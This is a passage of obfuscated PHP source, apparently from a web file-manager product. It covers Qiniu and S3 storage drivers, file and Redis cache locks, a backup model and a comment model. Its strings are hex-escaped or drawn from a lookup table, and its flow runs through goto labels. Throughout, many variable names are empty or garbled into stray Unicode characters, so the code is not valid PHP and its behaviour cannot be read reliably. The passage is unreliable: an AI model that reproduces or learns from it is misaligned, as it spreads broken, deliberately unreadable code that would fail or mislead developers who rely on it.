\Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($, $ = '', $ = REPEAT_RENAME) { if ($this->setContent($, $)) { return $this->getPathOuter($); } return !1; } public function mkdir($, $Ȍ = REPEAT_SKIP) { $̊ۑ =& $_SERVER[ʯ]; $ڲ = trim($, $̊ۑ[8]); if ($this->_isFolder($ڲ)) { return $this->getPathOuter($ڲ); } $ = $ڲ . $̊ۑ[8]; $ = get_path_this($ڲ); $Ρģ = $ . $; if (!$this->mkfile($Ρģ)) { return !1; } if (!$this->moveFile($Ρģ, $)) { $this->delFile($Ρģ); return !1; } return $this->getPathOuter($ڲ); } public function copyFile($, $) { $ = $this->bucketManager->copy($this->bucket, $, $this->bucket, $, !0); return $ ? !1 : $this->getPathOuter($); } public function moveFile($Ρ, $ۜ) { $֯ǲ = $this->bucketManager->move($this->bucket, $Ρ, $this->bucket, $ۜ, !0); return $֯ǲ ? !1 : $this->getPathOuter($ۜ); } public function delFile($) { if (!$this->exist($)) { return !0; } $ = $this->bucketManager->delete($this->bucket, $); return $ ? !1 : !0; } public function delFolder($) { $ =& $_SERVER[ʯ]; if (!$this->exist($)) { return !0; } $this->listItemCache = !1; $͙֌ = $this->fileList($); $this->listItemCache = !0; $ = trim($, $[8]) . $[8]; if (!empty($) && $ !== $[221] && !in_array($, $͙֌[$[92]])) { $͙֌[$[92]][] = $; } $쓲 = $this->delByBatch($͙֌[$[93]]); if (!$쓲) { return !1; } $쓲 = $this->delByBatch($͙֌[$[92]]); if (!$쓲) { return !1; } return $this->delFile($); } private function delByBatch($) { foreach (array_chunk($, 1000) as $) { $ޒ = $this->bucketManager->buildBatchDelete($this->bucket, $); list($ԁ, $) = $this->bucketManager->batch($ޒ); if ($) { return !1; } } return !0; } public function rename($, $Ƀÿ) { return $this->renameObject($, $Ƀÿ); } public function fileInfo($َ, $ɟ = false, $ٮ = array()) { $Ɇ =& $_SERVER[ʯ]; $ = array($Ɇ[42] => $this->pathThis($َ), $Ɇ[94] => $this->getPathOuter($Ɇ[8] . $َ), $Ɇ[43] => $Ɇ[223], $Ɇ[86] => isset($ٮ[$Ɇ[1472]]) ? $ٮ[$Ɇ[1472]] : 0, $Ɇ[184] => $this->ext($َ)); if ($ɟ) { return $; } $[$Ɇ[224]] = $[$Ɇ[95]] = 0; $[$Ɇ[225]] = $[$Ɇ[226]] = !0; if (empty($ٮ)) { $ٮ = $this->objectMeta($َ); if (!$ٮ) { return $; } } if (isset($ٮ[$Ɇ[227]]) && $ٮ[$Ɇ[227]]) { $[$Ɇ[228]] = $ٮ[$Ɇ[227]]; } if (isset($ٮ[$Ɇ[237]]) && $ٮ[$Ɇ[237]]) { $[$Ɇ[228]] = $ٮ[$Ɇ[237]]; } if (isset($ٮ[$Ɇ[1473]])) { $[$Ɇ[95]] = substr($ٮ[$Ɇ[1473]] . $Ɇ[12], 0, 10); } if (isset($ٮ[$Ɇ[1472]])) { $[$Ɇ[86]] = $ٮ[$Ɇ[1472]]; } return $; } public function folderInfo($ª, $ = false) { $˛ =& $_SERVER[ʯ]; $ֳ = array($˛[42] => $this->pathThis($ª), $˛[94] => $this->getPathOuter($˛[8] . $ª), $˛[43] => $˛[85]); if ($) { return $ֳ; } $ֳ[$˛[224]] = $ֳ[$˛[95]] = 0; $ֳ[$˛[225]] = $ֳ[$˛[226]] = !0; $ª = rtrim($ª, $˛[8]) . $˛[8]; $깍 = $this->objectMeta($ª); if (isset($깍[$˛[1473]])) { $ֳ[$˛[95]] = substr($깍[$˛[1473]] . $˛[12], 0, 10); } return $ֳ; } public function listPath($, $ÒѤ = false) { $ =& $_SERVER[ʯ]; $ = $this->fileList($, $[8], !0); foreach ($[$[92]] as $ => $˨̚) { $[$[92]][$] = $this->folderInfo($˨̚, $ÒѤ); } foreach ($[$[93]] as $ => $˨̚) { $[$[93]][$] = $this->fileInfo($˨̚[$[104]], $ÒѤ, $˨̚); } return $; } public function has($ݠü, $ = false, $ʘ = true) { $ =& $_SERVER[ʯ]; $ݠü = trim($ݠü, $[8]); $ = empty($ݠü) && $ݠü !== $[221] ? $[12] : $ݠü . $[8]; $ = $[12]; $ = 500; $ܽ = $[8]; $ɻ = $랔 = 0; while (!0) { check_abort(); list($ף, $) = $this->bucketManager->listFiles($this->bucket, $, $, $, $ܽ); if ($) { break; } $ = array_key_exists($[1441], $ף) ? $ = $ף[$[1474]] : $[12]; if ($) { if (!empty($ף[$[1475]])) { $ɻ += count($ף[$[1475]]); } if (!empty($ף[$[1476]])) { $랔 += count($ף[$[1476]]); } if ($ === $[12]) { break; } continue; } if ($ʘ) { if (!empty($ף[$[1475]])) { return !0; } } else { if (!empty($ף[$[1476]])) { return !0; } } if ($ === $[12]) { break; } } if ($) { return array($[232] => $ɻ, $[233] => $랔); } return !1; } public function listAll($) { $ =& $_SERVER[ʯ]; $ = $this->fileList($, $[12], !0); $ = array_to_keyvalue($[$[93]], $[42]); foreach ($[$[92]] as $) { if (is_string($)) { $[$] = array($[86] => 0); } } return $this->listAllFiles($, $); } private function fileList($䯘, $큳 = '', $ɳ = 0) { $ =& $_SERVER[ʯ]; $䯘 = trim($䯘, $[8]); $˳ = empty($䯘) && $䯘 !== $[221] ? $[12] : $䯘 . $[8]; $𴯑 = $[12]; $ս = 1000; $Ư = $ = array(); while (!0) { check_abort(); list($񜒷˟, $) = $this->bucketManager->listFiles($this->bucket, $˳, $𴯑, $ս, $큳); if ($) { break; } $𴯑 = array_key_exists($[1441], $񜒷˟) ? $𴯑 = $񜒷˟[$[1474]] : $[12]; $Ӡ = isset($񜒷˟[$[1475]]) ? $񜒷˟[$[1475]] : array(); $ = isset($񜒷˟[$[1476]]) ? $񜒷˟[$[1476]] : array(); foreach ($Ӡ as $̈́) { if ($̈́[$[104]] == $˳) { continue; } $ = $̈́[$[104]]; $ = $̈́[$[1472]]; $̈́[$[86]] = $; $ = $ == 0 && substr($, strlen($) - 1, 1) == $[8] ? !0 : !1; $this->cacheMethodInfoSet($, $, $̈́); if ($) { $Ư[] = $; continue; } $[] = $ɳ ? $̈́ : $; } foreach ($ as $) { if ($ == $˳) { continue; } $Ư[] = $; $this->cacheMethodInfoSet($, !0); } if ($𴯑 === $[12]) { break; } } $this->cacheMethodInfoSet($䯘, !0); return array($[92] => $Ư, $[93] => $); } public function canRead($Ūނ) { return $this->exist($Ūނ) ? !0 : !1; } public function canWrite($Ų) { return $this->exist($Ų) ? !0 : !1; } public function getContent($ܯ̓) { return $this->fileSubstr($ܯ̓, 0, -1); } public function setContent($ϸ, $ = '') { $ = $this->tempFile($this->pathThis($ϸ)); file_put_contents($, $); if ($this->upload($ϸ, $)) { $this->tempFileRemve($); return !0; } return !1; } public function refreshUrls($ǘ) { $ =& $_SERVER[ʯ]; $ާ = array(); if (is_array($ǘ)) { foreach ($ǘ as $س) { $ާ[] = $this->link($س); } } else { $ާ[] = $this->link($ǘ); } $ƪ = new Qiniu\Cdn\CdnManager($this->auth); list($Ӑ, $) = $ƪ->refreshUrls($ާ); if ($) { return !1; } return $Ӑ[$[1243]] == $[819] ? !0 : !1; } public function fileSubstr($ֿ, $, $) { $ƃ =& $_SERVER[ʯ]; if (!($˟ = $this->link($ֿ))) { return !1; } $ = !1; if ($ > 0) { $ħ = $ + $ - 1; $ = array($ƃ[1477] . $ . $ƃ[438] . $ħ); } $Ϡ = url_request($˟, $ƃ[254], !1, $); return $Ϡ[$ƃ[810]] ? $Ϡ[$ƃ[1263]] : !1; } public function upload($󭟟, $ٳ, $ٗȹ = false, $ = REPEAT_REPLACE) { $ׯѰ = new Qiniu\Storage\UploadManager(); $͆̊ = $this->auth->uploadToken($this->bucket, $󭟟); $ = get_file_mime(get_path_ext($ٳ)); list($, $) = $ׯѰ->putFile($͆̊, $󭟟, $ٳ, null, $); return $ ? !1 : $this->getPathOuter($󭟟); } public function uploadFormData($, $ = 3600) { return $this->uploadToken($, $); } public function multiUploadFormData($ʯ, $Α = 3600) { return $this->uploadToken($ʯ, $Α); } private function uploadToken($É, $ۋ = 3600) { $ə =& $_SERVER[ʯ]; $ŗ = $ۋ; $冲 = array($ə[1478] => $ə[1479]); $ = $É; $ױ = $this->auth->uploadToken($this->bucket, $, $ŗ, $冲, !0); $ݠ = empty($this->region) || $this->region == $ə[1480] ? $ə[12] : $ə[438] . $this->region; $״ = http_type() . "\x3a\x2f\x2f\x75\160\154\x6f\x61\144{$ݠ}\56\161\x69\x6e\x69\165\160\56\143\x6f\x6d\57"; return array($ə[1481] => $ױ, $ə[1482] => $״); } public function download($ؠ, $͹) { $č = IO::getPathInner(IO::mkfile($͹)); if (!($ = $this->link($ؠ))) { return !1; } $ = 0; $ϥ = 1024 * 200; $ԃ = fopen($č, $_SERVER[ʯ][1483]); while (!0) { $һ = $this->fileSubstr($ؠ, $, $ϥ); if ($һ === !1) { return !1; } fwrite($ԃ, $һ); $ += $ϥ; if (strlen($һ) < $ϥ) { break; } } fclose($ԃ); return $͹; } public function link($, $ڈ = '') { if (!$this->isFile($)) { return !1; } $ = $this->getHost() . $_SERVER[ʯ][8] . $this->pathEncode($) . $ڈ; return $this->auth->privateDownloadUrl($, 3600 * 12); } public function fileOut($, $ = false, $՛ = false, $ֺ = '') { $ɱ =& $_SERVER[ʯ]; if ($this->isFileOutServer()) { return $this->fileOutServer($, $, $՛, $ֺ); } if (!$՛) { $՛ = $this->pathThis($); } $׾ = $ ? $ɱ[1484] . rawurlencode($՛) : $ɱ[12]; $խ = $this->link($, $׾); $this->fileOutLink($խ); } public function fileOutServer($ާ, $ߏ = false, $ = false, $ب = '') { parent::fileOut($ާ, $ߏ, $, $ب); } public function fileOutImage($, $ = 250) { $ = $this->link($, $_SERVER[ʯ][1485] . $); $this->fileOutLink($); } public function fileOutImageServer($̜, $Ȃ = 250) { parent::fileOutImage($̜, $Ȃ); } public function hashMd5($ݣ) { $Бָ =& $_SERVER[ʯ]; $ = $this->objectMeta($ݣ); return isset($[$Бָ[237]]) ? $[$Бָ[237]] : !1; $ǈ = $this->link($ݣ, $Бָ[1486]); } public function size($) { $ = $this->objectMeta($); return $ ? $[$_SERVER[ʯ][86]] : 0; } public function info($) { if ($this->isFolder($)) { return $this->folderInfo($); } else { if ($this->isFile($)) { return $this->fileInfo($); } } return !1; } public function exist($ب) { return $this->isFile($ب) || $this->isFolder($ب); } public function isFile($) { return !$this->isFolder($) && $this->objectMeta($); } public function isFolder($ݑ) { return $this->cacheMethod($_SERVER[ʯ][175], $ݑ); } protected function objectMeta($ٜ) { return $this->cacheMethod($_SERVER[ʯ][177], $ٜ); } protected function _objectMeta($) { $ҍ =& $_SERVER[ʯ]; list($, $) = $this->bucketManager->stat($this->bucket, $); if ($) { $[$ҍ[86]] = intval($[$ҍ[1472]]); } return $; } protected function _isFolder($̰) { $מۓ =& $_SERVER[ʯ]; if ($̰ == $מۓ[12] || $̰ == $מۓ[8]) { return !0; } list($, $ؔ) = $this->bucketManager->listFiles($this->bucket, trim($̰, $מۓ[8]) . $מۓ[8], $מۓ[12], 1, $מۓ[8]); return !empty($[$מۓ[1475]]) || !empty($[$מۓ[1476]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($й) { parent::__construct($й); } public function uploadFormData($Ց, $읆 = 3600) { $ =& $_SERVER[ʯ]; $ٷÊ = $[222]; $ = $[261]; $Ŭ = $[72]; $ = gmdate($[262]); $ = gmdate($[263]); $Ƨ㭅 = $[264]; $ = $읆 . $[12]; $껃 = $[265]; $ = array($this->accessKey, $, $this->region, $Ŭ, $Ƨ㭅); $І = implode($[8], $); $Ώ = array($[266] => gmdate($[1385], strtotime($[268])), $[269] => array(array($[270] => $this->bucket), array($[271] => $ٷÊ), array($[272], $[273], $[12]), array($[272], $[274], $[12]), array($[272], $[275], $[12]), array($[276] => $껃), array($[277] => $І), array($[278] => $), array($[279] => $), array($[280] => $))); $ڹ = base64_encode(json_encode($Ώ)); $İʓ = hash_hmac($[281], $, $[282] . $this->secret, !0); $ȝ = hash_hmac($[281], $this->region, $İʓ, !0); $ = hash_hmac($[281], $Ŭ, $ȝ, !0); $ɩ = hash_hmac($[281], $Ƨ㭅, $, !0); $ = hash_hmac($[281], $ڹ, $ɩ); $ = array($[239] => $[12], $[283] => $[12], $[271] => $ٷÊ, $[276] => $껃, $[284] => $ڹ, $[285] => $І, $[286] => $, $[287] => $, $[288] => $, $[289] => $, $[205] => $this->getHost()); return $; } public function multiUploadFormData($, $ = 3600) { $ӥ =& $_SERVER[ʯ]; $ߤ = gmdate($ӥ[1487]); $ = array(); $٭ = $this->client->getUploadId($this->bucket, $, $); if (!$٭) { return !1; } return array($ӥ[247] => $٭, $ӥ[205] => $this->getHost() . $ӥ[8] . $this->pathEncode($), $ӥ[248] => $ߤ, $ӥ[104] => $); } public function multiUploadAuthData($, $򷸭 = array()) { $ =& $_SERVER[ʯ]; $ = isset($򷸭[$[184]]) ? $򷸭[$[184]] : $[12]; $ڂ = $򷸭[$[104]]; unset($򷸭[$[104]]); if (isset($򷸭[$[249]])) { return $this->listUploadParts($ڂ, $򷸭); } $р = array(); if (isset($򷸭[$[1488]])) { $р[$[1489]] = $򷸭[$[1488]]; } $ = explode($[207], $this->getHost()); $ = array($[1490] => $[1], $[1491] => $[12], $[239] => $[130], $[283] => $򷸭[$[86]]); $× = $[252]; $Ы = $[8] . $this->pathEncode($ڂ) . $; $ƒ = $this->client->__getSignatureV4($р, $, $×, $Ы); if (strpos($, $[251]) === 0) { if (isset($р[$[1489]])) { $실 = $р[$[1489]]; } else { if (isset($ƒ[$[1489]])) { $실 = $ƒ[$[1489]]; } else { $실 = hash($[281], $[12]); } } return array($[257] => $ƒ[$[257]], $[1489] => $실, $[248] => $ƒ[$[1492]]); } return $ƒ[$[257]]; } public function listUploadParts($, $ = array()) { $ݦ =& $_SERVER[ʯ]; $ީ = str_replace($ݦ[258], $ݦ[12], $[$ݦ[184]]); $ = $this->client->listParts($this->bucket, $, $ީ); if (!$) { return !1; } $ѐ = $ݦ[1493]; foreach ($ as $ɐ) { $ѐ .= $ݦ[1494] . "\74\120\x61\x72\164\116\x75\155\142\x65\x72\x3e{$ɐ[$ݦ[1449]]}\x3c\x2f\x50\141\x72\164\x4e\165\155\x62\145\x72\x3e\xa" . "\74\105\x54\141\x67\76{$ɐ[$ݦ[1450]]}\x3c\x2f\x45\124\x61\x67\76\12" . $ݦ[1495]; } $ѐ .= $ݦ[1496]; $͋ = array(); $ = explode($ݦ[207], $this->getHost()); $Ҝ = array($ݦ[1490] => $[1], $ݦ[239] => $ݦ[130], $ݦ[283] => strlen($ѐ)); $ = $ݦ[250]; $׈ = $ݦ[8] . $this->pathEncode($) . $[$ݦ[184]]; $ғ§ = $this->client->__getSignatureV4($͋, $Ҝ, $, $׈, $ѐ); return array($ݦ[257] => $ғ§[$ݦ[257]], $ݦ[248] => $ғ§[$ݦ[1492]], $ݦ[259] => $, $ݦ[1489] => $ғ§[$ݦ[1489]]); } public function link($Ƕݶ, $ = array()) { return parent::link($Ƕݶ, $); } public function fileOut($⧯, $ = false, $ִ = false, $ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ʯ][1497])) { return parent::fileOutServer($⧯, $, $ִ, $); } parent::fileOut($⧯, $, $ִ, $); } public function fileOutImage($迃, $Φ = 250) { if (strstr($this->endpoint, $_SERVER[ʯ][1497])) { return parent::fileOutImageServer($迃, $Φ); } parent::fileOutImage($迃, $Φ); } public function fileOutLink($껊) { $ =& $_SERVER[ʯ]; if (substr($껊, 0, 7) == $[1391]) { $껊 = $[1392] . substr($껊, 7); } header($[171] . $껊); die; } public function getHost() { $Ȁ =& $_SERVER[ʯ]; $Ϧ˧ = str_rtrim(parent::getHost(), $Ȁ[8] . $this->bucket); $Ϧ˧ = explode($Ȁ[207], $Ϧ˧); return $Ϧ˧[0] . $Ȁ[207] . $this->bucket . $Ȁ[10] . $Ϧ˧[1]; } } goto c͔ڪ; dՖ: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ =& $_SERVER[ʯ]; $Č = $GLOBALS[$[6]][$[401]]; self::$cachePath = $Č[$[223]][$[94]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ӗ, $ = 0) { $߶ =& $_SERVER[ʯ]; $ = microtime(!0); $ = $ + $ + 0.0001; $ޕ˿ = rtrim(self::$cachePath, $߶[8]) . $߶[924] . md5($ӗ) . $߶[921]; if (file_exists($ޕ˿) && filemtime($ޕ˿) && filemtime($ޕ˿) < time() - 10) { @unlink($ޕ˿); } do { if (file_exists($ޕ˿)) { cacheLockWait(); continue; } $ȥ = fopen($ޕ˿, $߶[925]); if (!$ȥ) { return !1; } $Ɛ = flock($ȥ, LOCK_EX | LOCK_NB); self::$caches[$ӗ] = array($߶[926] => $ȥ, $߶[223] => $ޕ˿); fwrite($ȥ, $); clearstatcache(); if ($ȥ && $Ɛ) { return !0; } cacheLockWait(); } while (microtime(!0) < $); $this->unlock($ӗ); return !1; } public function lockGet($ʤ) { $֋ =& $_SERVER[ʯ]; $Ɨ = rtrim(self::$cachePath, $֋[8]) . $֋[924] . md5($ʤ) . $֋[921]; return file_exists($Ɨ); } public function unlock($څ) { $ֺ =& $_SERVER[ʯ]; $; = self::$caches[$څ]; if (!$;) { return; } @flock($;[$ֺ[926]], LOCK_UN); @fclose($;[$ֺ[926]]); @unlink($;[$ֺ[223]]); unset(self::$caches[$څ]); } } class CacheLockRedis { public function lock($⪌, $ߙ = 10) { $ = Cache::init(); $δ = microtime(!0) + $ߙ; while (microtime(!0) < $δ) { $ = $->get($⪌); if (!$) { $ = $->setLock($⪌, $δ, $ߙ); if ($) { return !0; } } else { if ($ < microtime(!0)) { $->set($⪌, $δ, $ߙ * 2); if ($->get($⪌) === $) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($) { return Cache::init()->get($); } public function unlock($ݳǅ) { return Cache::init()->remove($ݳǅ); } } goto Dӧ; fڈ: class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\56\x62\141\143\x6b\165\160\x4c\x69\163\x74"; public $field = array("\x69\157", "\156\x61\x6d\x65", "\163\164\141\164\x75\x73", "\x63\x6f\156\164\145\156\x74", "\155\x61\x6e\x75\x61\x6c", "\x72\145\163\165\x6c\164", "\164\151\155\145\x46\162\x6f\155", "\164\151\155\145\x54\157"); public function config() { $й =& $_SERVER[ʯ]; $ޱ = Model($й[830])->get($й[840]); $ޱ = json_decode($ޱ, !0); $ޱ = is_array($ޱ) ? $ޱ : array(); if (!isset($ޱ[$й[814]])) { $ޱ[$й[814]] = $й[98]; } unset($ޱ[$й[1674]]); Action($й[1921])->taskInit(); Model($й[1673])->cacheClear(); $ˍ = $й[1922]; $Ƚ = Model($й[1923])->findByKey($й[1692], $ˍ); if (!$Ƚ) { $Ƚ = array(); } if (isset($Ƚ[$й[203]])) { $Ƚ[$й[203]] = json_decode($Ƚ[$й[203]], !0); } if (isset($ޱ[$й[203]])) { $Ƚ[$й[203]][$й[1677]] = $ޱ[$й[203]]; unset($ޱ[$й[203]]); } return array_merge($Ƚ, $ޱ); } public function listData($ݲ = false, $°ғ = "\155\x6f\144\x69\x66\171\x54\151\x6d\x65", $ = false) { return parent::listData($ݲ, $°ғ, !0); } public function lastItem() { $哐 = $this->listData(); return !empty($哐[0]) ? $哐[0] : null; } public function kill($) { $ϻ =& $_SERVER[ʯ]; $ = $this->listData($); if (!$ || empty($[$ϻ[42]])) { return !0; } Task::kill($ϻ[839]); Task::kill($ϻ[860]); Task::kill($ϻ[869]); $ʁ = $[$ϻ[42]]; $ = TEMP_FILES . $ϻ[838] . $ʁ . $ϻ[8]; IO::remove($, !1); return $this->remove($); } public function remove($ݧތ) { $ = $this->listData($ݧތ); if (!$) { return !0; } return $this->backupRemove($); } private function backupRemove($ع) { parent::remove($ع[$_SERVER[ʯ][451]]); $ = $this->backupPath($ع); IO::remove($, !1); return !0; } private function backupPath($ɀ) { $Ňƚ =& $_SERVER[ʯ]; $ = $ɀ[$Ňƚ[42]]; $ = Model($Ňƚ[830])->get($Ňƚ[831]); $Ǣ = substr(md5($Ňƚ[832] . $ . $), 0, 8); return "\173\151\x6f\x3a{$ɀ[$Ňƚ[811]]}\x7d\57\144\x61\164\x61\x62\x61\x73\145\x2f\x62\x61\x63\x6b\165\x70\57" . $ . $Ňƚ[11] . $Ǣ; } public function start() { $ѣ =& $_SERVER[ʯ]; if ($GLOBALS[$ѣ[6]][$ѣ[99]][$ѣ[1924]] != $ѣ[98]) { return !0; } $ = $this->config(); if (!$ || $[$ѣ[1674]] != $ѣ[98]) { return !1; } $ƚ = $this->process(); foreach ($ƚ as $) { if ($) { return Task::restart($[$ѣ[451]]); } } $Ƒ = new Backup(); $ = $Ƒ->db(); if ($) { $ = $Ƒ->dbFile(); if ($ && $[$ѣ[814]] == $ѣ[221]) { $ = $Ƒ->file(); } } Backup::set(array($ѣ[810] => 1, $ѣ[821] => time())); return !0; } public function process() { $ֱ =& $_SERVER[ʯ]; $ = array($ֱ[817] => Task::get($ֱ[839]), $ֱ[822] => Task::get($ֱ[860]), $ֱ[223] => Task::get($ֱ[869])); $ڵ = !1; foreach ($ as &$М) { if ($ڵ) { $М = !1; continue; } if ($М) { $ޔ = intval(_get($М, $ֱ[1709], 0)); if (time() - $ޔ > 7200) { Task::kill($М[$ֱ[451]]); $ڵ = !0; $М = !1; } } } return $; } public function restore() { $㨫 =& $_SERVER[ʯ]; ActionCall($㨫[1121], !0, 1); ActionCall($㨫[1121], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\155\x6d\x65\156\164"; protected $tableMeta = array("\x74\x61\142\x6c\x65\x4e\x61\x6d\145" => "\x63\157\x6d\x6d\145\156\x74\137\x6d\x65\164\x61", "\155\x65\x74\141\x46\151\145\x6c\x64" => "\143\x6f\155\155\145\x6e\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($) { $ʆ =& $_SERVER[ʯ]; if ($[$ʆ[1925]]) { $Ӷ = $this->where(array($ʆ[1926] => $[$ʆ[1925]]))->find(); if (!$Ӷ || $Ӷ[$ʆ[187]] != $[$ʆ[187]] || $Ӷ[$ʆ[546]] != $[$ʆ[546]]) { return !1; } $this->where(array($ʆ[1926] => $[$ʆ[1925]]))->setAdd($ʆ[1927], 1); } $[$ʆ[1928]] = 0; $[$ʆ[1927]] = 0; $[$ʆ[810]] = 1; return $this->add($); } public function commentCount($, $پ, $Ȃ = false) { $⵰ =& $_SERVER[ʯ]; if (!$) { return array(); } if (is_string($) || is_int($)) { $ = array($); } $ܖ = array($⵰[546], $⵰[1929] => $⵰[541]); $ֈʪ = array($⵰[546] => array($⵰[7], $), $⵰[187] => $پ); if ($Ȃ) { $ֈʪ[$⵰[1704]] = $Ȃ; } $ܢ = $this->field($ܖ)->where($ֈʪ)->group($⵰[546])->select(); return array_to_keyvalue($ܢ, $⵰[546], $⵰[541]); } public function starTarget($ٯ, $) { $ =& $_SERVER[ʯ]; $٥ = $ٯ + self::TYPE_STAR_OFFSET; $ɔ = array($[1704] => USER_ID, $[187] => $٥, $[546] => $); $펜 = $this->where($ɔ)->find(); if ($펜) { return $this->where(array($[451] => $펜[$[451]]))->delete(); } $ص = array($[1925] => 0, $[1704] => USER_ID, $[810] => 1, $[814] => $[12], $[187] => $٥, $[546] => $, $[1928] => 0, $[1927] => 0); return $this->add($ص); } public function starTargetCount($ވ, $ҧ) { $ =& $_SERVER[ʯ]; $ȉ = $ҧ + self::TYPE_STAR_OFFSET; $ = $this->commentCount($ވ, $ȉ); $ = $this->commentCount($ވ, $ȉ, USER_ID); return array($[1930] => $, $[1931] => $); } public function starTargetUserList($, $ο) { $仨 =& $_SERVER[ʯ]; $ן = $ + self::TYPE_STAR_OFFSET; $ = array($仨[546] => $ο, $仨[187] => $ן); $ = $this->where($)->count(); $ = array($仨[307] => $, $仨[1932] => array()); if (!$) { return $; } $ = $this->field($仨[1704])->where($)->limit(500)->select(); $ = array_to_keyvalue($, $仨[12], $仨[1704]); $[$仨[1932]] = Model($仨[554])->userListInfo($); return $; } public function prasiseUserList($) { $沅 =& $_SERVER[ʯ]; $ = array($沅[1933] => $); $݃ = $this->where($)->find(); $ = _get($݃, $沅[1928], 0); $Ȣ = array($沅[307] => $, $沅[1932] => array()); if (!$) { return $Ȣ; } $֚ = Model($沅[1934])->field($沅[1704])->where($)->limit(500)->select(); $֚ = array_to_keyvalue($֚, $沅[12], $沅[1704]); $Ȣ[$沅[1932]] = Model($沅[554])->userListInfo($֚); return $Ȣ; } public function remove($ԓз) { $Ʉ桶 =& $_SERVER[ʯ]; $ˮ = array($Ʉ桶[1926] => $ԓз); $Ú = $this->where($ˮ)->find(); if ($Ú[$Ʉ桶[1925]]) { $this->where(array($Ʉ桶[1926] => $Ú[$Ʉ桶[1925]]))->setAdd($Ʉ桶[1927], -1); } return $this->where($ˮ)->delete(); } public function edit($, $) { $ێ =& $_SERVER[ʯ]; $ǆ = array($ێ[1926] => $); return $this->where($ǆ)->save(array($ێ[1935] => $)); } public function prasise($璘) { $Ŗ =& $_SERVER[ʯ]; $ۋ = Model($Ŗ[1936]); $ = array($Ŗ[1926] => $璘, $Ŗ[1695] => USER_ID); $Ӳ = $ۋ->where($)->find(); if (!$Ӳ) { $ۋ->add($); $ = $this->where(array($Ŗ[1926] => $璘))->setAdd($Ŗ[1928], 1); } else { $ۋ->where($)->delete(); $ = $this->where(array($Ŗ[1926] => $璘))->setAdd($Ŗ[1928], -1); } return $; } public function targetInfo($ݵĿ, $ֶ) { $Ѝ =& $_SERVER[ʯ]; $ = array($Ѝ[624] => $ݵĿ, $Ѝ[625] => $ֶ); $ɟ = $this->where($)->count(); $Ɲ = "\x52\x49\x47\110\x54\x20\112\117\111\116\x20{$this->tablePrefix}\143\x6f\x6d\x6d\x65\x6e\x74\137\x70\162\x61\151\x73\145\40\163\x74\141\x72\40\x6f\156\x20\143\157\155\x6d\145\156\x74\x2e\143\x6f\x6d\x6d\x65\x6e\x74\x49\x44\x20\x3d\40\163\x74\x61\x72\56\143\x6f\155\155\145\x6e\164\111\x44"; $΀ = $this->alias($Ѝ[406])->where($)->join($Ɲ, $Ѝ[1937])->count(); $Ü = array($Ѝ[1938] => $ɟ, $Ѝ[1939] => $΀); return $Ü; } public function listData($) { $ܰ =& $_SERVER[ʯ]; if (isset($[$ܰ[1940]])) { if ($[$ܰ[1940]]) { $[$ܰ[1933]] = array($ܰ[1075], intval($[$ܰ[1940]])); } unset($[$ܰ[1940]]); } if (isset($[$ܰ[1941]])) { if ($[$ܰ[1941]]) { $[$ܰ[1933]] = array($ܰ[1072], intval($[$ܰ[1941]])); } unset($[$ܰ[1941]]); } return $this->_listData($); } private function _listData($´ؐ) { $® =& $_SERVER[ʯ]; $ = $this->where($´ؐ)->_makeOrder()->selectPage(100); $this->_listAppendParent($[$®[421]]); $this->_listAppendUser($[$®[421]]); $this->_listAppendMeta($[$®[421]]); return $; } private function _makeOrder() { $ =& $_SERVER[ʯ]; $ = array($[1928], $[1927], $[224]); $ = Input::get($[506], $[7], $[473], $); $ = Input::get($[507], $[7], $[1697], array($[1942], $[502])); $ = $ . $[63] . $; return $this->order($); } private function _listAppendParent(&$Əྵ) { $ =& $_SERVER[ʯ]; $ύ = array_unique(array_to_keyvalue($Əྵ, $[12], $[1925])); $ύ = array_remove_value($ύ, $[221]); if (!$ύ) { return; } $ƴ뿳 = $this->where(array($[1926] => array($[7], $ύ)))->select(); $ƴ뿳 = array_to_keyvalue($ƴ뿳, $[1933]); foreach ($Əྵ as &$յ) { if (isset($ƴ뿳[$յ[$[1925]]])) { $յ[$[1943]] = $ƴ뿳[$յ[$[1925]]]; } } unset($յ); } private function _listAppendUser(&$奴) { $쪊 =& $_SERVER[ʯ]; $ψ = array_unique(array_to_keyvalue($奴, $쪊[12], $쪊[1704])); $ψ = array_remove_value($ψ, $쪊[221]); if (count($ψ) == 0) { return; } foreach ($奴 as $) { if (isset($[$쪊[1943]])) { $ψ[] = $[$쪊[1943]][$쪊[1704]]; } } $ͨ߻ = Model($쪊[575])->userListInfo($ψ); foreach ($奴 as &$) { $[$쪊[638]] = $ͨ߻[$[$쪊[1704]]]; if (isset($[$쪊[1943]])) { $[$쪊[1943]][$쪊[638]] = $ͨ߻[$[$쪊[1943]][$쪊[1704]]]; } } unset($); } private function _listAppendMeta(&$琁) { $̣ =& $_SERVER[ʯ]; $ = array_unique(array_to_keyvalue($琁, $̣[12], $̣[1933])); $ = array_remove_value($, $̣[221]); if (!$) { return; } foreach ($琁 as $) { if (isset($[$̣[1943]])) { $[] = $[$̣[1943]][$̣[1933]]; } } $ = $this->metaList($); if (!$) { return !1; } foreach ($琁 as &$) { $[$̣[515]] = $[$[$̣[1933]]]; if (isset($[$̣[1943]])) { $[$̣[1943]][$̣[515]] = $[$[$̣[1943]][$̣[1933]]]; } } unset($); } private function metaList($) { $ =& $_SERVER[ʯ]; if (!$) { return array(); } $ = array($[1933] => array($[7], $)); $ā = Model($[1944])->where($)->select(); $ā = array_to_keyvalue_group($ā, $[1933]); foreach ($ā as $꿹Ǆ => $) { $ = array(); foreach ($ as $֣) { $[$֣[$[104]]] = $֣[$[426]]; } $ā[$꿹Ǆ] = $; } return $ā 